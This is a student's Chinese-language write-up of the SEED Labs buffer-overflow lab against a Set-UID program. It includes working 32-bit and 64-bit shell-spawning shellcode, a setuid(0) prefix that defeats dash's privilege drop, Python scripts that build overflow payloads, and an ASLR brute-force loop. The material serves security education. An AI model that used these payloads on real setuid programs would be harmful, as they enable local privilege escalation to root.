---
title: SeedLab ex4 Buffer Overflow Attack Lab (Set-UID Version)
date: 2024-01-09
categories:
 - 网络安全
cover: /images/covers/traffic.png
---
美丽
<!-- more -->
## env setup

1. 关闭地址空间随机化
```bash
sudo sysctl -w kernel.randomize_va_space=0
```
2. 配置 /bin/sh，换一个shell
```bash
sudo ln -sf /bin/zsh /bin/sh
```
3. StackGuard 和 Non-Executable Stack。这是系统中实施的另外两个对策。它们可以在编译时关闭。

## Task1: Getting Familiar with Shellcode

shellcode是shell的启动代码，包含命令和参数

实验中给的call_shellcode，目的是执行其中嵌入的```setuid()```程序，提升用户权限到root


记一下注释
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Binary code for setuid(0)
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"

const char shellcode[] =
#if __x86_64__
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
    ;

int main(int argc, char **argv) {
  char code[500];

  strcpy(code, shellcode);
  int (*func)() = (int (*)())code; // 将缓冲区地址强制转换成函数指针

  func(); //调用函数指针执行程序
  return 1;
}
```

makefile里的编译 ```gcc -z execstack -o a64.out call_shellcode.c```，```-z execstack```可以在堆栈上执行代码，```make```后执行代码，在没执行```make setuid```是提示符是```$```set，执行后提示符是```#```，成功获取了root权限。


## Task2:Understanding the Vulnerable Program

**源代码**
程序的BUF_SIZE设定为100，在badfile中读入了517字节数据
调用了```dummy_function()```，插入了一个1000字节的栈帧（可能是用来模拟正常程序运行是对栈的操作？修改栈的布局），再调用```bof()```，执行```strcpy(buffer, str);```插入恶意代码，需要覆盖到返回地址，使程序跳转到非预期的位置，再执行一个打开shell的操作就能获取到set-uid程序为root的root权限的。

**编译**
编译时要带上```-fno-stack-protector``` 和 ```-z execstack```分别是关闭stackgurad选项和堆栈保护，再执行```chown root```和```chmod 4755```操作，4755中的4是set-uid的设定(启用suid，4表示以文件所有者权限运行而不是运行者权限)，剩余的三个为所有者，所有者所在组和其他的rwx权限。


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str) {
  char buffer[BUF_SIZE];

  // The following statement has a buffer overflow problem
  strcpy(buffer, str);

  return 1;
}

int main(int argc, char **argv) {
  char str[517];
  FILE *badfile;

  // 读入文件
  badfile = fopen("badfile", "r");
  if (!badfile) {
    perror("Opening badfile");
    exit(1);
  }

  int length = fread(str, sizeof(char), 517, badfile);
  printf("Input size: %d\n", length);
  dummy_function(str); //将文件内容复制到缓冲区
  fprintf(stdout, "==== Returned Properly ====\n");
  return 1;
}

// This function is used to insert a stack frame of size
// 1000 (approximately) between main's and bof's stack frames.
// The function itself does not do anything.
void dummy_function(char *str) {
  char dummy_buffer[1000];// 插入了一个栈帧
  memset(dummy_buffer, 0, 1000); 
  bof(str);
}

```

##  Task3: Launching Attack on 32-bit Program (Level 1)

找到缓冲区起始地址与存储返回地址之前的距离，用调试的方法找，但是地址不能直接用调试使用的地址，调试的地址和运行的地址是不一样的，所以，调试只能找到参数之间的关系。

1. offert

执行make，debug L1

1. ```gdb stack-L1-dbg```打开调试程序
2. ```b bof()```设置断点
3. ```run```运行，到达断点
4. ```next```单步
5. ```p $ebp```查看ebp寄存器
6. ```p $buffer```查看buffer地址


用exploit.py编写badfile

具体找的方法：
1. 先看ebp基址指针，指针的内容是这个函数基址地址，基址地址里存放的是上一个函数的基址地址，基质地址的上一个字是存放函数返回地址的地址，这个地址就与buffer[0]的距离是offset，**```offset = ebp+4-buffer[0]```**
~~2~~. 原本的思路是设定一个大于offset的start值，buffer[0]+start的结果地址就是ret的地址，这样参数设定下来跑是能跑通，而且调试里面看过来地址也是对刚好对应上的，但是！在start-offset 到start的区间里也能成功跑通，搞这个搞了3个小时没想明白，战略性放弃一下（**奇怪的问题解决了，大概是调试和运行用的地址不是同样的地址，所以运行时打印地址看看**）
3. ret的边缘的值为offset+start，这个是刚刚好的位置。start的值和缓冲区大小有一定关系，首先不能和ret存储的位置产生覆盖，然后将shellcode放在ret前面或者后面得看缓冲区


因为添加了打印地址的一行，所以把stack.c也放上来了

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str) {
  char buffer[BUF_SIZE];

  // The following statement has a buffer overflow problem
  strcpy(buffer, str);
  printf("buffer_address:%p\n", buffer);
  return 1;
}

int main(int argc, char **argv) {
  char str[517];
  FILE *badfile;

  badfile = fopen("badfile", "r");
  if (!badfile) {
    perror("Opening badfile");
    exit(1);
  }

  int length = fread(str, sizeof(char), 517, badfile);
  printf("Input size: %d\n", length);
  printf("str:%p\n", str);
  dummy_function(str);
  fprintf(stdout, "==== Returned Properly ====\n");
  return 1;
}

// This function is used to insert a stack frame of size
// 1000 (approximately) between main's and bof's stack frames.
// The function itself does not do anything.
void dummy_function(char *str) {
  char dummy_buffer[1000];
  memset(dummy_buffer, 0, 1000);
  bof(str);
}
```


生成badfile的代码
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 255             # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0xffffca4c+start           # Change this number
offset = 112              # Change this number

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)


```

## Task4: Launching Attack without Knowing Buffer Size (Level 2)

不知道buffer_size，不好确定offset，已知buffer范围为100-200，所以就把100-200上都放上返回地址，start取517-len(shell_code)，放在最后面，ret取最前面的值buffer[0]+200+8

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 490             # Change this number ,517 - len(shell_code)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0xffffca58+8+200           # Change this number


L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
for offset in range(100, 204, 4):
    content[offset:offset + 4] = (ret).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
```

### Task 5: Launching Attack on 64-bit Program (Level 3)

64位攻击，地址高位存放0000，strcpy会自动停止，所以把shellcode放在ret位置前面，即地址较小的地方

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 0             # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0x00007fffffffd830+start           # Change this number buffer[0]+start
offset = 216              # Change this number rbp - offset[0]+8

L = 8     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

```

## Task 6: Launching Attack on 64-bit Program (Level 4)

缓冲区不足，可以使用main中从badfile中读入的str的地址作为ret。这时badfile的start就不能是0了，因为缓冲区太小会和ret产生覆盖，需要大于10+8+8=26，

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 26             # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0x00007fffffffdd30+start           # Change this number buffer[0]+start
offset = 18             # Change this number rbp - offset[0]+8

L = 8     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
```

## Tasks 7: Defeating dash’s Countermeasure


先把shell弄回来，在原本的dash里检测到有效用户effective uid不等于真实用户real uid是会减低权限。之前通过软连接link到另一个shell，现在重新链接回来指向dash
```bash
sudo ln -sf /bin/dash /bin/sh
```

在shellcode里加上setuid的汇编指令，然后验证

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Binary code for setuid(0)
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"

const char shellcode[] =
#if __x86_64__
    "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
    "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
    ;

int main(int argc, char **argv) {
  char code[500];

  strcpy(code, shellcode);
  int (*func)() = (int (*)())code; // 将缓冲区地址强制转换成函数指针

  func(); //调用函数指针执行程序
  return 1;
}
```

## Task 8: Defeating Address Randomization

打开地址随机化

```sh
sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

文档给的bash脚本程序，看这个程序，像是没变动badfile的话，大概是疯狂执行这个程序，然后让地址随机到badfile的位置

```bash
#!/bin/bash
SECONDS=0
value=0
while true; do
value=$(( $value + 1 ))
duration=$SECONDS
min=$(($duration / 60))
sec=$(($duration % 60))
echo "$min minutes and $sec seconds elapsed."
echo "The program has been running $value times so far."
./stack-L1
done
```

执行

```bash
sudo bash attack.sh
```

## Tasks 9: Experimenting with Other Countermeasures

### Task 9.a: Turn on the StackGuard Protection

关闭地址随机化，重试L1，确保实验成功，去除编译flags里的```-fno-stack-protector```，这是用来保护对堆栈溢出的，如果要修改返回地址那就一定会产生堆栈溢出
```FLAGS    = -z execstack ~~-fno-stack-protector~~```

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```

会出现结果如下：
```bash
*** stack smashing detected ***: terminated
```

### Task 9.b: Turn on the Non-executable Stack Protection
删除编译文件中的堆栈可执行flag ~~-z execstack~~，重新编译执行查看结果，结果就是segmentation fault

